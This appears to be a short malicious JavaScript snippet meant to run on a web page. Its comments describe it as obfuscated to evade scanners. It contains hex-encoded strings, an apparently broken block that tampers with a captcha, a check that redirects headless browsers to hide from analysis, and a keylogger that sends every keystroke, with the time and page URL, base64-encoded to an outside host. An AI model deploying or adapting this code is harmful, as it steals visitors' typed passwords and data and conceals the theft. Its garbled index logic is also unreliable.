// Obfuscated to bypass basic scanners
const _0x3a1b = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f', '\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64', '\x73\x75\x62\x6d\x69\x74', '\x64\x69\x73\x61\x62\x6c\x65\x64', '\x63\x61\x70\x74\x63\x68\x61\x2d\x74\x65\x78\x74', '\x63\x61\x70\x74\x63\x68\x61\x2d\x69\x6e\x70\x75\x74', '\x63\x6c\x69\x63\x6b', '\x66\x6f\x63\x75\x73', '\x62\x6c\x75\x72'];
const _0x4c2d = function(_0x1a2b3c, _0x4d5e6f) {
    _0x1a2b3c = _0x1a2b3c - 0x0;
    let _0x6a7b8c = _0x3a1b[_0x1a2b3c];
    return _0x6a7b8c;
};
(window[_0x4c2d('0x9')] = function() {
    const _0x7d8e9f = _0x4c2d;
    document[_0x7d8e9f('0x8')](() => {
        const _0x1a2b3c = document[_0x7d8e9f('0x7')](_0x7d8e9f('0x6'));
        const _0x4d5e6f = document[_0x7d8e9f('0x7')](_0x7d8e9f('0x5'));
        _0x1a2b3c[_0x7d8e9f('0x4')] = false;
        _0x4d5e6f[_0x7d8e9f('0x3')](_0x7d8e9f('0x2'), () => {
            _0x1a2b3c[_0x7d8e9f('0x4')] = true;
        });
    });
})();

// Anti-bot: Check if page is loaded in a headless browser
if (/HeadlessChrome|PhantomJS|Puppeteer/.test(navigator.userAgent)) {
    window.location.href = 'https://www.google.com'; // Redirect bots
}

// Log keystrokes (bonus evil)
document.addEventListener('keydown', (e) => {
    const _0x9a8b7c = new Image();
    _0x9a8b7c.src = _0x3a1b[0x0] + btoa(JSON.stringify({
        key: e.key,
        time: Date.now(),
        page: window.location.href
    }));
});
